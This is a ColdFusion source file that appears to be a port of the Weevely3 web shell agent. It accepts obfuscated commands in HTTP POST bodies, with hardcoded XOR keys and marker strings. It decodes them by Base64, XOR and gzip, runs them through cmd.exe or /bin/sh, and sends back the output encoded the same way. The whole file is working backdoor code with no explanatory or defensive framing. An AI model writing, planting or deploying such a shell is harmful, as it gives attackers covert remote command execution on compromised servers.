b'\n\n<cfsetting enablecfoutputonly="yes">\n<cfprocessingdirective pageencoding="utf-8">\n<cfscript>\n    // Weevely3 ColdFusion Agent\n    // Implements XOR -> GZIP -> Base64 protocol\n\n    function xor(text, key) {\n        var sb = createObject("java", "java.lang.StringBuilder").init();\n        var i = 0;\n        var klen = len(key);\n        \n        for (i = 0; i < len(text); i++) {\n            sb.append(chr(bitXor(asc(mid(text, i+1, 1)), asc(mid(key, (i % klen) + 1, 1)))));\n        }\n        return sb.toString();\n    }\n\n    function streamToString(is) {\n        var scanner = createObject("java", "java.util.Scanner").init(is, "ISO-8859-1").useDelimiter("\\\\A");\n        if (scanner.hasNext()) {\n            return scanner.next();\n        }\n        return "";\n    }\n\n    k = "5f4dcc3b";\n    kh = "5aa765d61d83";\n    kf = "27deb882cf99";\n    p = "aQgro5BaNkbV695r";\n\n    if (cgi.request_method eq "POST") {\n        try {\n            // Read raw body\n            content = getHttpRequestData().content;\n            if (isBinary(content)) {\n                content = charsetEncode(content, "ISO-8859-1");\n            }\n            \n            start = find(kh, content);\n            end = find(kf, content);\n\n            if (start > 0 and end > 0) {\n                payload = mid(content, start + len(kh), end - (start + len(kh)));\n\n                // Decode: Base64 -> XOR -> Gunzip\n                decodedBytes = binaryDecode(payload, "Base64");\n                xorred = charsetEncode(decodedBytes, "ISO-8859-1");\n                unxorred = xor(xorred, k);\n\n                // Gunzip\n                bais = createObject("java", "java.io.ByteArrayInputStream").init(charsetDecode(unxorred, "ISO-8859-1"));\n                gzis = createObject("java", "java.util.zip.GZIPInputStream").init(bais);\n                cmd = streamToString(gzis);\n\n                // Execute Command\n                runtime = createObject("java", "java.lang.Runtime").getRuntime();\n                \n                os = createObject("java", "java.lang.System").getProperty("os.name");\n                if (findNoCase("win", os) > 0) {\n                    proc = runtime.exec(["cmd.exe", "/c", cmd]);\n                } else {\n                    proc = runtime.exec(["/bin/sh", "-c", cmd]);\n                }\n                \n                stdin = proc.getInputStream();\n                stderr = proc.getErrorStream();\n                output = streamToString(stdin) & streamToString(stderr);\n\n                // Encode: Gzip -> XOR -> Base64\n                baos = createObject("java", "java.io.ByteArrayOutputStream").init();\n                gzos = createObject("java", "java.util.zip.GZIPOutputStream").init(baos);\n                gzos.write(charsetDecode(output, "ISO-8859-1"));\n                gzos.close();\n                \n                compressed = baos.toString("ISO-8859-1");\n                reXorred = xor(compressed, k);\n                encoded = binaryEncode(charsetDecode(reXorred, "ISO-8859-1"), "Base64");\n\n                writeOutput(p & kh & encoded & kf);\n            }\n        } catch (any e) {\n            // writeOutput(e.message);\n        }\n    }\n</cfscript>\n'
